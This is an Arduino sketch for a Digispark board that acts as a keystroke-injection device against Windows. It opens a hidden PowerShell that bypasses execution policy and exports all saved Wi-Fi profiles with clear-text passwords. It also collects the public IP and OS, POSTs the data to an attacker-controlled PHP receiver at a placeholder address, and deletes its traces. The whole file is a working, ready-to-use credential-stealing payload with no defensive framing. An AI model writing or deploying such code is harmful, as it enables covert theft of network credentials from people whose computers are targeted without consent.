#include "DigiKeyboard.h"

#define KEY_R 0x15

void setup() {
  pinMode(1, OUTPUT); // onboard LED
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  // 1. Open PowerShell (hidden, bypass execution policy)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(800);
  DigiKeyboard.print("powershell -NoP -Ex Bypass -W Hidden");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3500);

  // 2. Setup variables (your server URL and temp folder)
  DigiKeyboard.print(
    F("$u='http://YOUR_IP/wifi-recv.php';$t=$env:TEMP;")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);

  // 3. Export Wi-Fi profiles to XML (language independent)
  DigiKeyboard.print(
    F("netsh wlan export profile folder=\"$t\" key=clear;")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);

  // 4. Parse XML and build objects: Time, SSID, Pass, IP, OS
  DigiKeyboard.print(
    F("$w = Get-ChildItem \"$t\\Wi-Fi-*.xml\" | ForEach-Object {")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  DigiKeyboard.print(
    F("  [xml]$x = Get-Content $_.FullName;")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  DigiKeyboard.print(
    F("  $s = $x.WLANProfile.name;")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  DigiKeyboard.print(
    F("  $p = $x.WLANProfile.MSM.Security.sharedKey.keyMaterial;")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  DigiKeyboard.print(
    F("  [PSCustomObject]@{")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  DigiKeyboard.print(
    F("    Time = (Get-Date -Format 'dd MMM yyyy, hh:mm:ss tt');")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  DigiKeyboard.print(
    F("    SSID = $s;")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  DigiKeyboard.print(
    F("    Pass = if ($p) { $p } else { '' };")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  DigiKeyboard.print(
    F("    IP   = (Invoke-WebRequest -UseBasicParsing 'https://api.ipify.org').Content;")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  DigiKeyboard.print(
    F("    OS   = (Get-CimInstance Win32_OperatingSystem).Caption")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  DigiKeyboard.print(
    F("  }")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  DigiKeyboard.print(
    F("  Remove-Item $_.FullName")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  DigiKeyboard.print(
    F("};")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1200);

  // 5. Export CSV, POST to your PHP receiver, cleanup, exit
  DigiKeyboard.print(
    F("$csv = \"$t\\w.csv\";")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  DigiKeyboard.print(
    F("$w | Export-Csv $csv -NoTypeInformation;")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1200);

  DigiKeyboard.print(
    F("Invoke-WebRequest -UseBasicParsing -Uri $u -Method Post -Body (Get-Content $csv -Raw);")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);

  DigiKeyboard.print(
    F("Remove-Item $csv; exit")
  );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Blink LED forever to signal completion
  while (true) {
    digitalWrite(1, HIGH);
    DigiKeyboard.delay(150);
    digitalWrite(1, LOW);
    DigiKeyboard.delay(150);
  }
}
